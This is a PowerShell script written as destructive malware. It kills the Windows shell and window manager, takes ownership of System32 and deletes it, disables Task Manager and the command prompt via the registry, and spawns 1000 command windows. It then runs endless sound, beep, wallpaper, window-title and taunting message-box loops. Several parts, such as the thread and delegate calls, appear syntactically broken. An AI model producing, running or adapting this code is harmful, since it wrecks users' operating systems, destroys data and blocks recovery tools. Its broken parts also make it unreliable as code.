# --- ADD WIN32 API FOR WINDOW MANIPULATION ---
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Drawing;
namespace Win32 {
    public class Utils {
        [DllImport("user32.dll")]
        public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint flags);
        
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
        
        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        
        [DllImport("user32.dll")]
        public static extern int SetWindowText(IntPtr hWnd, string lpString);

        [DllImport("user32.dll")]
        public static extern bool EnumWindows(EnumWindowsProc ewp, IntPtr lParam);

        public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern bool IsWindowVisible(IntPtr hWnd);
    }
}
"@

# --- CONFIGURATION ---
$VoiceText   = "soi soi Soi Soi Soi Soi Soi soi soi Soi Soi Soi Soi Soi Soi sois soi 676767 haha made by just a random user on yt lolol"
$MsgTrap     = "you fall into my trap now get your computer cooked I deleted system 32"
$MsgRestart  = "have you tried turning off and on"
$MsgTitle    = "winint"
$CmdCount    = 1000
$AppToOpen   = "notepad.exe"  
$HolzerPath  = "$env:USERPROFILE\Desktop\holzer.exe"

# --- FUNCTION: Kill Explorer and DWM ---
function Kill-UI {
    Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
    Stop-Process -Name "dwm"      -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 1500
}

# --- FUNCTION: Speak Voice ---
function Speak-Text {
    $Speech = New-Object -ComObject SAPI.SpVoice
    $Speech.Rate = 3 # Very fast
    $Speech.Speak($VoiceText)
}

# --- FUNCTION: Show Message Box at Random Location ---
function Show-RandomMsg {
    try {
        $width = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width
        $height = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Height
        $randX = Get-Random -Minimum 0 -Maximum ($width - 300)
        $randY = Get-Random -Minimum 0 -Maximum ($height - 100)
        $msg = Get-Random -InputObject @($MsgTrap, $MsgRestart)

        $form = New-Object System.Windows.Forms.Form
        $form.Text = $MsgTitle
        $form.Width = 400
        $form.Height = 150
        $form.StartPosition = "Manual"
        $form.Location = New-Object System.Drawing.Point($randX, $randY)
        $form.BackColor = "White"
        
        $label = New-Object System.Windows.Forms.Label
        $label.Text = $msg
        $label.AutoSize = $true
        $label.Location = New-Object System.Drawing.Point(10, 10)
        $form.Controls.Add($label)

        $button = New-Object System.Windows.Forms.Button
        $button.Text = "OK"
        $button.Location = New-Object System.Drawing.Point(150, 80)
        $button.Add_Click({ $form.Close() })
        $form.Controls.Add($button)

        $form.ShowDialog() | Out-Null
    } catch {}
}

# --- FUNCTION: Flash Rainbow Wallpaper ---
function Start-RainbowWallpaper {
    $Colors = @(
        "C:\Windows\Globalization\Fonts\seguiemj.ttf", # Dummy path, we use colors via Bitmap
        # We will generate simple color bitmaps
    )
    
    # Create a temporary bitmap file for each color
    $TempBmp = "$env:TEMP\RainbowWall.bmp"
    $Bitmap = New-Object System.Drawing.Bitmap(1920, 1080)
    $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)

    $ColorsList = @(
        [System.Drawing.Color]::Red,
        [System.Drawing.Color]::Orange,
        [System.Drawing.Color]::Yellow,
        [System.Drawing.Color]::Green,
        [System.Drawing.Color]::Blue,
        [System.Drawing.Color]::Indigo,
        [System.Drawing.Color]::Violet
    )

    $RainbowThread = [Threading.Thread]::Start({
        param($ColorsList, $TempBmp)
        while ($true) {
            foreach ($color in $ColorsList) {
                $Graphics.Clear($color)
                $Bitmap.Save($TempBmp)
                # Set wallpaper via Registry
                Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "WallPaper" -Value $TempBmp
                # Refresh Desktop
                [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                    ([System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate({
                        param([IntPtr] hWnd, [int] message, [IntPtr] wParam, [IntPtr] lParam)
                    })).Method.Handle,
                    [Func[IntPtr, int, IntPtr, IntPtr, bool]]
                ).Invoke([IntPtr]::Zero, 0x001E, [IntPtr]::Zero, [IntPtr]::Zero) # WM_SETTINGCHANGE
                Start-Sleep -Milliseconds 200
            }
        }
    }, $ColorsList, $TempBmp)
}

# --- FUNCTION: Move All Windows to Corners ---
function Move-WindowsToCorners {
    $Screens = [System.Windows.Forms.Screen]::AllScreens
    foreach ($screen in $Screens) {
        $Width = $screen.Bounds.Width
        $Height = $screen.Bounds.Height
        
        # Define 4 corners
        $Corners = @(
            @{X=0; Y=0},
            @{X=$Width-200; Y=0},
            @{X=0; Y=$Height-100},
            @{X=$Width-200; Y=$Height-100}
        )
        
        $WindowList = @()
        [Win32.Utils]::EnumWindows({
            param($hWnd, $lParam)
            if ([Win32.Utils]::IsWindowVisible($hWnd)) {
                $WindowList += $hWnd
            }
            return $true
        }, [IntPtr]::Zero) | Out-Null

        $CornerIndex = 0
        foreach ($hWnd in $WindowList) {
            $Corner = $Corners[$CornerIndex % 4]
            # Force window to corner
            [Win32.Utils]::SetWindowPos($hWnd, [IntPtr]::Zero, $Corner.X, $Corner.Y, 200, 100, 0x0040) # SWP_NOZORDER
            $CornerIndex++
        }
    }
}

# --- FUNCTION: Randomize Window Titles ---
function Start-TitleRandomizer {
    $TitleThread = [Threading.Thread]::Start({
        while ($true) {
            $WindowList = @()
            [Win32.Utils]::EnumWindows({
                param($hWnd, $lParam)
                if ([Win32.Utils]::IsWindowVisible($hWnd)) {
                    $WindowList += $hWnd
                }
                return $true
            }, [IntPtr]::Zero) | Out-Null

            foreach ($hWnd in $WindowList) {
                # Generate random hex code
                $RandCode = "{0:X8}" -f (Get-Random -Maximum 4294967295)
                [Win32.Utils]::SetWindowText($hWnd, $RandCode)
            }
            Start-Sleep -Seconds 3
        }
    })
}

# --- MAIN EXECUTION ---

# 1. Kill Explorer and DWM (First Time)
Kill-UI

# 2. Voice Announcement
Speak-Text

# 3. Initial Message
Show-RandomMsg

# 4. Kill Explorer and DWM (Second Time)
Kill-UI

# 5. Take Ownership of System32
Write-Host "Taking Ownership of System32..." -ForegroundColor Red
# This requires Admin. It sets the Owner to the current user.
$System32Path = "$env:SystemRoot\System32"
$File = Get-Item $System32Path
$Security = $File.GetAccessControl()
$Security.SetOwner([System.Security.Principal.NtAccount]$env:USERNAME)
$File.SetAccessControl($Security)

# 6. Delete System32
Write-Host "Deleting System32..." -ForegroundColor Red
Remove-Item $System32Path -Recurse -Force -ErrorAction SilentlyContinue

# 7. Open App
Start-Process $AppToOpen

# 8. Open Holzer.exe
if (Test-Path $HolzerPath) {
    Start-Process $HolzerPath
}

# 9. Open CMD 1000 Times
Write-Host "Spawning 1000 CMD windows..." -ForegroundColor Magenta
for ($i = 1; $i -le $CmdCount; $i++) {
    Start-Process "cmd.exe" -ArgumentList "/k title CMD_Loop_$i"
    Start-Sleep -Milliseconds 50 
}

# 10. Disable Task Manager
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Type Dword -Force

# 11. Launch Random Sound Spam
$SoundCommand = 'while(1){(New-Object Media.SoundPlayer (Get-Item "C:\Windows\Media\*.wav" | Get-Random).FullName).PlaySync()}';
Start-Process powershell.exe -ArgumentList "-w hidden -c $SoundCommand" -WindowStyle Hidden

# 12. Disable CMD (Kill existing and block via Registry)
Write-Host "Disabling CMD..." -ForegroundColor Yellow
Stop-Process -Name "cmd" -Force -ErrorAction SilentlyContinue
# Block CMD via Registry (DisableRegistryTools style but for CMD)
Set-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name "DisableCMD" -Value 2 -Type Dword -Force

# 13. Start Rainbow Wallpaper Flashing
Write-Host "Starting Rainbow Wallpaper..." -ForegroundColor Cyan
Start-RainbowWallpaper

# 14. Start Infinite Beeps
$BeepThread = [Threading.Thread]::Start({
    while ($true) {
        [System.Console]::Beep(440, 200)
        Start-Sleep -Milliseconds 300
    }
})

# 15. Move Windows to Corners & Start Title Randomizer
Write-Host "Cornering Windows and Randomizing Titles..." -ForegroundColor Magenta
Move-WindowsToCorners
Start-TitleRandomizer

# 16. Loop Spam Messages
Write-Host "Starting Infinite Message Spam..." -ForegroundColor Red
while ($true) {
    Show-RandomMsg
    Start-Sleep -Milliseconds 2000
}